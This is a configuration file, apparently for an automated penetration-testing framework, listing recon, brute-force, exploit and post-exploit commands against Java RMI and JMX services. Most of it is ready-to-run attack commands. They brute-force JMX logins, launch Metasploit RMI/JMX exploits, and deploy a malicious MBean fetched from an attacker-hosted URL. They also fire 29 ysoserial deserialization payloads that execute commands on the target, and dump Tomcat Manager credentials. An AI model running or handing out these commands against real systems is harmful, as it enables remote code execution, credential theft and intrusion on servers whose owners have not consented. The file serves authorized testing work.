#########################################################################################
# JAVA-RMI Settings
#########################################################################################

[config]
default_port = 1099
protocol	 = tcp
categories 	 = recon, vulnscan, bruteforce, exploit, postexploit

[specific_options]
jmx = boolean
rmissl = boolean
jmx-auth-disabled = boolean


#########################################################################################
# Recon
#########################################################################################
[check_nmap-recon]
name        = nmap-recon
category    = recon
description = Attempt to dump all objects from Java-RMI service
tool        = nmap
command_1   = sudo nmap -sT -sV -Pn -vv -p [PORT] --script='rmi-dumpregistry' --stats-every 10s [IP]
postrun     = nmap_detect_jmx_and_rmissl

[check_rmi-enum]
name        = rmi-enum
category    = recon
description = Enumerate RMI services
tool        = barmie
command_1   = java -jar BaRMIe_*.jar -enum [IP] [PORT]

[check_jmx-info]
name        = jmx-info
category    = recon
description = Get information about JMX and the MBean server
tool        = twiddle
command_1   = ./bin/twiddle.sh -v --host=[IP] --port=[PORT] serverinfo -d -c -l
context_1   = { 'jmx': True }
command_2   = ./bin/twiddle.sh -v --host=[IP] --port=[PORT] get "jboss.system:type=ServerInfo"
context_2   = { 'jmx': True }


#########################################################################################
# Vulnscan
#########################################################################################
[check_vuln-lookup]
name        = vuln-lookup
category    = vulnscan
description = Vulnerability lookup in Vulners.com (NSE scripts) and exploit-db.com (lots of false positive !)
tool        = vuln-databases
command_1   = sudo nmap -sT -sV -T5 -Pn -p [PORT] --script nmap-vulners/vulners.nse --script-args vulscandb=scipvuldb.csv [IP] -oX /tmp/nmaptmp.xml; ./exploit-database/searchsploit --nmap /tmp/nmaptmp.xml; rm -f /tmp/nmaptmp.xml


#########################################################################################
# Bruteforce
#########################################################################################
[check_jmx-bruteforce]
name        = jmx-bruteforce
category    = bruteforce
description = Bruteforce creds to connect to JMX registry
tool        = jmxbf
command_1   = java -cp 'jmxbf.jar:./commons-cli-1.4/*' jmxbf -h [IP] -p [PORT] --usernames-file [WORDLISTSDIR]/services/java-rmi/jmx_usernames.txt --passwords-file [WORDLISTSDIR]/passwords/pass_medium.txt
context_1   = { 'jmx': True, 'auth_status': NO_AUTH }
postrun     = jmxbf_valid_creds


#########################################################################################
# Exploit
#########################################################################################
[check_rmi-default-config-deploy-class]
name        = exploit-rmi-default-config
category    = exploit
description = Exploit default config in RMI Registry to load classes from any remote URL (not working against JMX)
tool        = metasploit
command_1   = sudo msfconsole -q -x "use exploit/multi/misc/java_rmi_server; set RHOST [IP]; set RPORT [PORT]; set VERBOSE true; set LPORT 8443; set SRVPORT 9080; [RMISSL true="set SSL true;"]exploit; sleep 15; exit"
context_1   = { 'jmx': False }

[check_jmx-insecure-config-deploy-class]
name        = exploit-jmx-insecure-config
category    = exploit
description = Exploit JMX insecure config. Auth disabled: should be vuln. Auth enabled: vuln if weak config
tool        = metasploit
command_1   = sudo msfconsole -q -x "use exploit/multi/misc/java_jmx_server; set RHOST [IP]; set RPORT [PORT]; set VERBOSE true; set LPORT 8443; set SRVPORT 9080; exploit; sleep 15; exit"
context_1   = { 'jmx': True, 'auth_status': NO_AUTH }
command_2   = sudo msfconsole -q -x "use exploit/multi/misc/java_jmx_server; set RHOST [IP]; set RPORT [PORT]; set VERBOSE true; set LPORT 8443; set SRVPORT 9080; set JMX_ROLE [USERNAME]; set JMX_PASSWORD [PASSWORD]; exploit; sleep 15; exit"
context_2   = { 'jmx': True, 'auth_status': POST_AUTH }

[check_jmx-auth-disabled-deploy-class]
name        = jmx-auth-disabled-deploy-class
category    = exploit
description = Deploy malicious MBean on JMX service with auth disabled (alternative to msf module)
tool        = sjet
command_1   = jython sjet.py [IP] [PORT] p3nt3st install http://[LOCALIP]:8000 8000
context_1   = { 'jmx': True }
# Set jmxauthdisabled = true if exploitation works
command_2   = jython sjet.py [IP] [PORT] p3nt3st command "id"
context_2   = { 'jmx': True, 'jmx-auth-disabled': True }
command_3   = jython sjet.py [IP] [PORT] p3nt3st command "whoami"
context_3   = { 'jmx': True, 'jmx-auth-disabled': True }
#command_4   = jython sjet.py [IP] [PORT] p3nt3st uninstall
#context_4   = { 'jmx': True, 'jmx-auth-disabled': True }

[check_tomcat-jmxrmi-deserialize]
name        = tomcat-jmxrmi-deserialize
category    = exploit
description = Exploit Java-RMI deserialize in Tomcat (CVE-2016-8735, CVE-2016-8735), req. JmxRemoteLifecycleListener
tool        = jexboss
command_1   = python2.7 jexboss.py --auto-exploit --jmxtomcat -u [IP]:[PORT] --cmd whoami
context_1   = { 'jmx': True }

[check_rmi-deserialize-all-payloads]
name        = rmi-deserialize-all-payloads
category    = exploit
description = Attempt to exploit Java deserialize against Java RMI Registry with all ysoserial payloads
tool        = ysoserial
# Generates commands via: 
# java -jar ysoserial-master.jar 2> a.txt; i=1; for payl in `cat a.txt | grep '@' | awk '{print $1}'`; do echo 'command_'$i'   =echo "[~] Checking ysoserial '$payl' payload ..."; echo "[~] Will try to ping local IP = [LOCALIP]"; echo "[~] Running tcpdump in background..."; sudo sh -c "tcpdump -U -i any -w /tmp/dump.pcap icmp &" ; java -cp ysoserial-master.jar ysoserial.exploit.RMIRegistryExploit [IP] [PORT] '$payl' "/bin/ping -c 4 [LOCALIP]"; echo "[~] Wait a little bit..."; sleep 3; PID=$(ps -e | pgrep tcpdump); echo "[~] Kill tcpdump"; sudo kill -9 $PID; sleep 2; echo "[~] Captured ICMP traffic:"; echo; sudo tcpdump -r /tmp/dump.pcap; echo "[~] Delete capture"; sudo rm /tmp/dump.pcap'; i=`expr $i + 1`; done; rm a.txt
command_1   =echo "[~] Checking ysoserial BeanShell1 payload ..."; echo "[~] Will try to ping local IP = [LOCALIP]"; echo "[~] Running tcpdump in background..."; sudo sh -c "tcpdump -U -i any -w /tmp/dump.pcap icmp &" ; java -cp ysoserial-master.jar ysoserial.exploit.RMIRegistryExploit [IP] [PORT] BeanShell1 "/bin/ping -c 4 [LOCALIP]"; echo "[~] Wait a little bit..."; sleep 3; PID=$(ps -e | pgrep tcpdump); echo "[~] Kill tcpdump"; sudo kill -9 $PID; sleep 2; echo "[~] Captured ICMP traffic:"; echo; sudo tcpdump -r /tmp/dump.pcap; echo "[~] Delete capture"; sudo rm /tmp/dump.pcap
command_2   =echo "[~] Checking ysoserial C3P0 payload ..."; echo "[~] Will try to ping local IP = [LOCALIP]"; echo "[~] Running tcpdump in background..."; sudo sh -c "tcpdump -U -i any -w /tmp/dump.pcap icmp &" ; java -cp ysoserial-master.jar ysoserial.exploit.RMIRegistryExploit [IP] [PORT] C3P0 "/bin/ping -c 4 [LOCALIP]"; echo "[~] Wait a little bit..."; sleep 3; PID=$(ps -e | pgrep tcpdump); echo "[~] Kill tcpdump"; sudo kill -9 $PID; sleep 2; echo "[~] Captured ICMP traffic:"; echo; sudo tcpdump -r /tmp/dump.pcap; echo "[~] Delete capture"; sudo rm /tmp/dump.pcap
command_3   =echo "[~] Checking ysoserial Clojure payload ..."; echo "[~] Will try to ping local IP = [LOCALIP]"; echo "[~] Running tcpdump in background..."; sudo sh -c "tcpdump -U -i any -w /tmp/dump.pcap icmp &" ; java -cp ysoserial-master.jar ysoserial.exploit.RMIRegistryExploit [IP] [PORT] Clojure "/bin/ping -c 4 [LOCALIP]"; echo "[~] Wait a little bit..."; sleep 3; PID=$(ps -e | pgrep tcpdump); echo "[~] Kill tcpdump"; sudo kill -9 $PID; sleep 2; echo "[~] Captured ICMP traffic:"; echo; sudo tcpdump -r /tmp/dump.pcap; echo "[~] Delete capture"; sudo rm /tmp/dump.pcap
command_4   =echo "[~] Checking ysoserial CommonsBeanutils1 payload ..."; echo "[~] Will try to ping local IP = [LOCALIP]"; echo "[~] Running tcpdump in background..."; sudo sh -c "tcpdump -U -i any -w /tmp/dump.pcap icmp &" ; java -cp ysoserial-master.jar ysoserial.exploit.RMIRegistryExploit [IP] [PORT] CommonsBeanutils1 "/bin/ping -c 4 [LOCALIP]"; echo "[~] Wait a little bit..."; sleep 3; PID=$(ps -e | pgrep tcpdump); echo "[~] Kill tcpdump"; sudo kill -9 $PID; sleep 2; echo "[~] Captured ICMP traffic:"; echo; sudo tcpdump -r /tmp/dump.pcap; echo "[~] Delete capture"; sudo rm /tmp/dump.pcap
command_5   =echo "[~] Checking ysoserial CommonsCollections1 payload ..."; echo "[~] Will try to ping local IP = [LOCALIP]"; echo "[~] Running tcpdump in background..."; sudo sh -c "tcpdump -U -i any -w /tmp/dump.pcap icmp &" ; java -cp ysoserial-master.jar ysoserial.exploit.RMIRegistryExploit [IP] [PORT] CommonsCollections1 "/bin/ping -c 4 [LOCALIP]"; echo "[~] Wait a little bit..."; sleep 3; PID=$(ps -e | pgrep tcpdump); echo "[~] Kill tcpdump"; sudo kill -9 $PID; sleep 2; echo "[~] Captured ICMP traffic:"; echo; sudo tcpdump -r /tmp/dump.pcap; echo "[~] Delete capture"; sudo rm /tmp/dump.pcap
command_6   =echo "[~] Checking ysoserial CommonsCollections2 payload ..."; echo "[~] Will try to ping local IP = [LOCALIP]"; echo "[~] Running tcpdump in background..."; sudo sh -c "tcpdump -U -i any -w /tmp/dump.pcap icmp &" ; java -cp ysoserial-master.jar ysoserial.exploit.RMIRegistryExploit [IP] [PORT] CommonsCollections2 "/bin/ping -c 4 [LOCALIP]"; echo "[~] Wait a little bit..."; sleep 3; PID=$(ps -e | pgrep tcpdump); echo "[~] Kill tcpdump"; sudo kill -9 $PID; sleep 2; echo "[~] Captured ICMP traffic:"; echo; sudo tcpdump -r /tmp/dump.pcap; echo "[~] Delete capture"; sudo rm /tmp/dump.pcap
command_7   =echo "[~] Checking ysoserial CommonsCollections3 payload ..."; echo "[~] Will try to ping local IP = [LOCALIP]"; echo "[~] Running tcpdump in background..."; sudo sh -c "tcpdump -U -i any -w /tmp/dump.pcap icmp &" ; java -cp ysoserial-master.jar ysoserial.exploit.RMIRegistryExploit [IP] [PORT] CommonsCollections3 "/bin/ping -c 4 [LOCALIP]"; echo "[~] Wait a little bit..."; sleep 3; PID=$(ps -e | pgrep tcpdump); echo "[~] Kill tcpdump"; sudo kill -9 $PID; sleep 2; echo "[~] Captured ICMP traffic:"; echo; sudo tcpdump -r /tmp/dump.pcap; echo "[~] Delete capture"; sudo rm /tmp/dump.pcap
command_8   =echo "[~] Checking ysoserial CommonsCollections4 payload ..."; echo "[~] Will try to ping local IP = [LOCALIP]"; echo "[~] Running tcpdump in background..."; sudo sh -c "tcpdump -U -i any -w /tmp/dump.pcap icmp &" ; java -cp ysoserial-master.jar ysoserial.exploit.RMIRegistryExploit [IP] [PORT] CommonsCollections4 "/bin/ping -c 4 [LOCALIP]"; echo "[~] Wait a little bit..."; sleep 3; PID=$(ps -e | pgrep tcpdump); echo "[~] Kill tcpdump"; sudo kill -9 $PID; sleep 2; echo "[~] Captured ICMP traffic:"; echo; sudo tcpdump -r /tmp/dump.pcap; echo "[~] Delete capture"; sudo rm /tmp/dump.pcap
command_9   =echo "[~] Checking ysoserial CommonsCollections5 payload ..."; echo "[~] Will try to ping local IP = [LOCALIP]"; echo "[~] Running tcpdump in background..."; sudo sh -c "tcpdump -U -i any -w /tmp/dump.pcap icmp &" ; java -cp ysoserial-master.jar ysoserial.exploit.RMIRegistryExploit [IP] [PORT] CommonsCollections5 "/bin/ping -c 4 [LOCALIP]"; echo "[~] Wait a little bit..."; sleep 3; PID=$(ps -e | pgrep tcpdump); echo "[~] Kill tcpdump"; sudo kill -9 $PID; sleep 2; echo "[~] Captured ICMP traffic:"; echo; sudo tcpdump -r /tmp/dump.pcap; echo "[~] Delete capture"; sudo rm /tmp/dump.pcap
command_10   =echo "[~] Checking ysoserial CommonsCollections6 payload ..."; echo "[~] Will try to ping local IP = [LOCALIP]"; echo "[~] Running tcpdump in background..."; sudo sh -c "tcpdump -U -i any -w /tmp/dump.pcap icmp &" ; java -cp ysoserial-master.jar ysoserial.exploit.RMIRegistryExploit [IP] [PORT] CommonsCollections6 "/bin/ping -c 4 [LOCALIP]"; echo "[~] Wait a little bit..."; sleep 3; PID=$(ps -e | pgrep tcpdump); echo "[~] Kill tcpdump"; sudo kill -9 $PID; sleep 2; echo "[~] Captured ICMP traffic:"; echo; sudo tcpdump -r /tmp/dump.pcap; echo "[~] Delete capture"; sudo rm /tmp/dump.pcap
command_11   =echo "[~] Checking ysoserial FileUpload1 payload ..."; echo "[~] Will try to ping local IP = [LOCALIP]"; echo "[~] Running tcpdump in background..."; sudo sh -c "tcpdump -U -i any -w /tmp/dump.pcap icmp &" ; java -cp ysoserial-master.jar ysoserial.exploit.RMIRegistryExploit [IP] [PORT] FileUpload1 "/bin/ping -c 4 [LOCALIP]"; echo "[~] Wait a little bit..."; sleep 3; PID=$(ps -e | pgrep tcpdump); echo "[~] Kill tcpdump"; sudo kill -9 $PID; sleep 2; echo "[~] Captured ICMP traffic:"; echo; sudo tcpdump -r /tmp/dump.pcap; echo "[~] Delete capture"; sudo rm /tmp/dump.pcap
command_12   =echo "[~] Checking ysoserial Groovy1 payload ..."; echo "[~] Will try to ping local IP = [LOCALIP]"; echo "[~] Running tcpdump in background..."; sudo sh -c "tcpdump -U -i any -w /tmp/dump.pcap icmp &" ; java -cp ysoserial-master.jar ysoserial.exploit.RMIRegistryExploit [IP] [PORT] Groovy1 "/bin/ping -c 4 [LOCALIP]"; echo "[~] Wait a little bit..."; sleep 3; PID=$(ps -e | pgrep tcpdump); echo "[~] Kill tcpdump"; sudo kill -9 $PID; sleep 2; echo "[~] Captured ICMP traffic:"; echo; sudo tcpdump -r /tmp/dump.pcap; echo "[~] Delete capture"; sudo rm /tmp/dump.pcap
command_13   =echo "[~] Checking ysoserial Hibernate1 payload ..."; echo "[~] Will try to ping local IP = [LOCALIP]"; echo "[~] Running tcpdump in background..."; sudo sh -c "tcpdump -U -i any -w /tmp/dump.pcap icmp &" ; java -cp ysoserial-master.jar ysoserial.exploit.RMIRegistryExploit [IP] [PORT] Hibernate1 "/bin/ping -c 4 [LOCALIP]"; echo "[~] Wait a little bit..."; sleep 3; PID=$(ps -e | pgrep tcpdump); echo "[~] Kill tcpdump"; sudo kill -9 $PID; sleep 2; echo "[~] Captured ICMP traffic:"; echo; sudo tcpdump -r /tmp/dump.pcap; echo "[~] Delete capture"; sudo rm /tmp/dump.pcap
command_14   =echo "[~] Checking ysoserial Hibernate2 payload ..."; echo "[~] Will try to ping local IP = [LOCALIP]"; echo "[~] Running tcpdump in background..."; sudo sh -c "tcpdump -U -i any -w /tmp/dump.pcap icmp &" ; java -cp ysoserial-master.jar ysoserial.exploit.RMIRegistryExploit [IP] [PORT] Hibernate2 "/bin/ping -c 4 [LOCALIP]"; echo "[~] Wait a little bit..."; sleep 3; PID=$(ps -e | pgrep tcpdump); echo "[~] Kill tcpdump"; sudo kill -9 $PID; sleep 2; echo "[~] Captured ICMP traffic:"; echo; sudo tcpdump -r /tmp/dump.pcap; echo "[~] Delete capture"; sudo rm /tmp/dump.pcap
command_15   =echo "[~] Checking ysoserial JBossInterceptors1 payload ..."; echo "[~] Will try to ping local IP = [LOCALIP]"; echo "[~] Running tcpdump in background..."; sudo sh -c "tcpdump -U -i any -w /tmp/dump.pcap icmp &" ; java -cp ysoserial-master.jar ysoserial.exploit.RMIRegistryExploit [IP] [PORT] JBossInterceptors1 "/bin/ping -c 4 [LOCALIP]"; echo "[~] Wait a little bit..."; sleep 3; PID=$(ps -e | pgrep tcpdump); echo "[~] Kill tcpdump"; sudo kill -9 $PID; sleep 2; echo "[~] Captured ICMP traffic:"; echo; sudo tcpdump -r /tmp/dump.pcap; echo "[~] Delete capture"; sudo rm /tmp/dump.pcap
command_16   =echo "[~] Checking ysoserial JRMPClient payload ..."; echo "[~] Will try to ping local IP = [LOCALIP]"; echo "[~] Running tcpdump in background..."; sudo sh -c "tcpdump -U -i any -w /tmp/dump.pcap icmp &" ; java -cp ysoserial-master.jar ysoserial.exploit.RMIRegistryExploit [IP] [PORT] JRMPClient "/bin/ping -c 4 [LOCALIP]"; echo "[~] Wait a little bit..."; sleep 3; PID=$(ps -e | pgrep tcpdump); echo "[~] Kill tcpdump"; sudo kill -9 $PID; sleep 2; echo "[~] Captured ICMP traffic:"; echo; sudo tcpdump -r /tmp/dump.pcap; echo "[~] Delete capture"; sudo rm /tmp/dump.pcap
command_17   =echo "[~] Checking ysoserial JRMPListener payload ..."; echo "[~] Will try to ping local IP = [LOCALIP]"; echo "[~] Running tcpdump in background..."; sudo sh -c "tcpdump -U -i any -w /tmp/dump.pcap icmp &" ; java -cp ysoserial-master.jar ysoserial.exploit.RMIRegistryExploit [IP] [PORT] JRMPListener "/bin/ping -c 4 [LOCALIP]"; echo "[~] Wait a little bit..."; sleep 3; PID=$(ps -e | pgrep tcpdump); echo "[~] Kill tcpdump"; sudo kill -9 $PID; sleep 2; echo "[~] Captured ICMP traffic:"; echo; sudo tcpdump -r /tmp/dump.pcap; echo "[~] Delete capture"; sudo rm /tmp/dump.pcap
command_18   =echo "[~] Checking ysoserial JSON1 payload ..."; echo "[~] Will try to ping local IP = [LOCALIP]"; echo "[~] Running tcpdump in background..."; sudo sh -c "tcpdump -U -i any -w /tmp/dump.pcap icmp &" ; java -cp ysoserial-master.jar ysoserial.exploit.RMIRegistryExploit [IP] [PORT] JSON1 "/bin/ping -c 4 [LOCALIP]"; echo "[~] Wait a little bit..."; sleep 3; PID=$(ps -e | pgrep tcpdump); echo "[~] Kill tcpdump"; sudo kill -9 $PID; sleep 2; echo "[~] Captured ICMP traffic:"; echo; sudo tcpdump -r /tmp/dump.pcap; echo "[~] Delete capture"; sudo rm /tmp/dump.pcap
command_19   =echo "[~] Checking ysoserial JavassistWeld1 payload ..."; echo "[~] Will try to ping local IP = [LOCALIP]"; echo "[~] Running tcpdump in background..."; sudo sh -c "tcpdump -U -i any -w /tmp/dump.pcap icmp &" ; java -cp ysoserial-master.jar ysoserial.exploit.RMIRegistryExploit [IP] [PORT] JavassistWeld1 "/bin/ping -c 4 [LOCALIP]"; echo "[~] Wait a little bit..."; sleep 3; PID=$(ps -e | pgrep tcpdump); echo "[~] Kill tcpdump"; sudo kill -9 $PID; sleep 2; echo "[~] Captured ICMP traffic:"; echo; sudo tcpdump -r /tmp/dump.pcap; echo "[~] Delete capture"; sudo rm /tmp/dump.pcap
command_20   =echo "[~] Checking ysoserial Jdk7u21 payload ..."; echo "[~] Will try to ping local IP = [LOCALIP]"; echo "[~] Running tcpdump in background..."; sudo sh -c "tcpdump -U -i any -w /tmp/dump.pcap icmp &" ; java -cp ysoserial-master.jar ysoserial.exploit.RMIRegistryExploit [IP] [PORT] Jdk7u21 "/bin/ping -c 4 [LOCALIP]"; echo "[~] Wait a little bit..."; sleep 3; PID=$(ps -e | pgrep tcpdump); echo "[~] Kill tcpdump"; sudo kill -9 $PID; sleep 2; echo "[~] Captured ICMP traffic:"; echo; sudo tcpdump -r /tmp/dump.pcap; echo "[~] Delete capture"; sudo rm /tmp/dump.pcap
command_21   =echo "[~] Checking ysoserial Jython1 payload ..."; echo "[~] Will try to ping local IP = [LOCALIP]"; echo "[~] Running tcpdump in background..."; sudo sh -c "tcpdump -U -i any -w /tmp/dump.pcap icmp &" ; java -cp ysoserial-master.jar ysoserial.exploit.RMIRegistryExploit [IP] [PORT] Jython1 "/bin/ping -c 4 [LOCALIP]"; echo "[~] Wait a little bit..."; sleep 3; PID=$(ps -e | pgrep tcpdump); echo "[~] Kill tcpdump"; sudo kill -9 $PID; sleep 2; echo "[~] Captured ICMP traffic:"; echo; sudo tcpdump -r /tmp/dump.pcap; echo "[~] Delete capture"; sudo rm /tmp/dump.pcap
command_22   =echo "[~] Checking ysoserial MozillaRhino1 payload ..."; echo "[~] Will try to ping local IP = [LOCALIP]"; echo "[~] Running tcpdump in background..."; sudo sh -c "tcpdump -U -i any -w /tmp/dump.pcap icmp &" ; java -cp ysoserial-master.jar ysoserial.exploit.RMIRegistryExploit [IP] [PORT] MozillaRhino1 "/bin/ping -c 4 [LOCALIP]"; echo "[~] Wait a little bit..."; sleep 3; PID=$(ps -e | pgrep tcpdump); echo "[~] Kill tcpdump"; sudo kill -9 $PID; sleep 2; echo "[~] Captured ICMP traffic:"; echo; sudo tcpdump -r /tmp/dump.pcap; echo "[~] Delete capture"; sudo rm /tmp/dump.pcap
command_23   =echo "[~] Checking ysoserial Myfaces1 payload ..."; echo "[~] Will try to ping local IP = [LOCALIP]"; echo "[~] Running tcpdump in background..."; sudo sh -c "tcpdump -U -i any -w /tmp/dump.pcap icmp &" ; java -cp ysoserial-master.jar ysoserial.exploit.RMIRegistryExploit [IP] [PORT] Myfaces1 "/bin/ping -c 4 [LOCALIP]"; echo "[~] Wait a little bit..."; sleep 3; PID=$(ps -e | pgrep tcpdump); echo "[~] Kill tcpdump"; sudo kill -9 $PID; sleep 2; echo "[~] Captured ICMP traffic:"; echo; sudo tcpdump -r /tmp/dump.pcap; echo "[~] Delete capture"; sudo rm /tmp/dump.pcap
command_24   =echo "[~] Checking ysoserial Myfaces2 payload ..."; echo "[~] Will try to ping local IP = [LOCALIP]"; echo "[~] Running tcpdump in background..."; sudo sh -c "tcpdump -U -i any -w /tmp/dump.pcap icmp &" ; java -cp ysoserial-master.jar ysoserial.exploit.RMIRegistryExploit [IP] [PORT] Myfaces2 "/bin/ping -c 4 [LOCALIP]"; echo "[~] Wait a little bit..."; sleep 3; PID=$(ps -e | pgrep tcpdump); echo "[~] Kill tcpdump"; sudo kill -9 $PID; sleep 2; echo "[~] Captured ICMP traffic:"; echo; sudo tcpdump -r /tmp/dump.pcap; echo "[~] Delete capture"; sudo rm /tmp/dump.pcap
command_25   =echo "[~] Checking ysoserial ROME payload ..."; echo "[~] Will try to ping local IP = [LOCALIP]"; echo "[~] Running tcpdump in background..."; sudo sh -c "tcpdump -U -i any -w /tmp/dump.pcap icmp &" ; java -cp ysoserial-master.jar ysoserial.exploit.RMIRegistryExploit [IP] [PORT] ROME "/bin/ping -c 4 [LOCALIP]"; echo "[~] Wait a little bit..."; sleep 3; PID=$(ps -e | pgrep tcpdump); echo "[~] Kill tcpdump"; sudo kill -9 $PID; sleep 2; echo "[~] Captured ICMP traffic:"; echo; sudo tcpdump -r /tmp/dump.pcap; echo "[~] Delete capture"; sudo rm /tmp/dump.pcap
command_26   =echo "[~] Checking ysoserial Spring1 payload ..."; echo "[~] Will try to ping local IP = [LOCALIP]"; echo "[~] Running tcpdump in background..."; sudo sh -c "tcpdump -U -i any -w /tmp/dump.pcap icmp &" ; java -cp ysoserial-master.jar ysoserial.exploit.RMIRegistryExploit [IP] [PORT] Spring1 "/bin/ping -c 4 [LOCALIP]"; echo "[~] Wait a little bit..."; sleep 3; PID=$(ps -e | pgrep tcpdump); echo "[~] Kill tcpdump"; sudo kill -9 $PID; sleep 2; echo "[~] Captured ICMP traffic:"; echo; sudo tcpdump -r /tmp/dump.pcap; echo "[~] Delete capture"; sudo rm /tmp/dump.pcap
command_27   =echo "[~] Checking ysoserial Spring2 payload ..."; echo "[~] Will try to ping local IP = [LOCALIP]"; echo "[~] Running tcpdump in background..."; sudo sh -c "tcpdump -U -i any -w /tmp/dump.pcap icmp &" ; java -cp ysoserial-master.jar ysoserial.exploit.RMIRegistryExploit [IP] [PORT] Spring2 "/bin/ping -c 4 [LOCALIP]"; echo "[~] Wait a little bit..."; sleep 3; PID=$(ps -e | pgrep tcpdump); echo "[~] Kill tcpdump"; sudo kill -9 $PID; sleep 2; echo "[~] Captured ICMP traffic:"; echo; sudo tcpdump -r /tmp/dump.pcap; echo "[~] Delete capture"; sudo rm /tmp/dump.pcap
command_28   =echo "[~] Checking ysoserial URLDNS payload ..."; echo "[~] Will try to ping local IP = [LOCALIP]"; echo "[~] Running tcpdump in background..."; sudo sh -c "tcpdump -U -i any -w /tmp/dump.pcap icmp &" ; java -cp ysoserial-master.jar ysoserial.exploit.RMIRegistryExploit [IP] [PORT] URLDNS "/bin/ping -c 4 [LOCALIP]"; echo "[~] Wait a little bit..."; sleep 3; PID=$(ps -e | pgrep tcpdump); echo "[~] Kill tcpdump"; sudo kill -9 $PID; sleep 2; echo "[~] Captured ICMP traffic:"; echo; sudo tcpdump -r /tmp/dump.pcap; echo "[~] Delete capture"; sudo rm /tmp/dump.pcap
command_29   =echo "[~] Checking ysoserial Wicket1 payload ..."; echo "[~] Will try to ping local IP = [LOCALIP]"; echo "[~] Running tcpdump in background..."; sudo sh -c "tcpdump -U -i any -w /tmp/dump.pcap icmp &" ; java -cp ysoserial-master.jar ysoserial.exploit.RMIRegistryExploit [IP] [PORT] Wicket1 "/bin/ping -c 4 [LOCALIP]"; echo "[~] Wait a little bit..."; sleep 3; PID=$(ps -e | pgrep tcpdump); echo "[~] Kill tcpdump"; sudo kill -9 $PID; sleep 2; echo "[~] Captured ICMP traffic:"; echo; sudo tcpdump -r /tmp/dump.pcap; echo "[~] Delete capture"; sudo rm /tmp/dump.pcap


#########################################################################################
# Postexploit
#########################################################################################
[check_tomcat-jmxrmi-manager-creds]
name        = tomcat-jmxrmi-manager-creds
category    = postexploit
description = Retrieve Manager creds on Tomcat JMX (req. auth disabled or creds known on JMX)
tool        = jmxploit
# Attempt anonymous connection (when JMX auth is disabled)
command_1   = java -jar jmxploit.jar --host [IP] --port [PORT] --attack DisplayPassword
context_1   = { 'jmx': True, 'auth_status': NO_AUTH }
# When JMX auth enabled and creds are known
command_2   = java -jar jmxploit.jar --host [IP] --port [PORT] --login [USERNAME] --password [PASSWORD] --attack DisplayPassword
context_2   = { 'jmx': True, 'auth_status': POST_AUTH }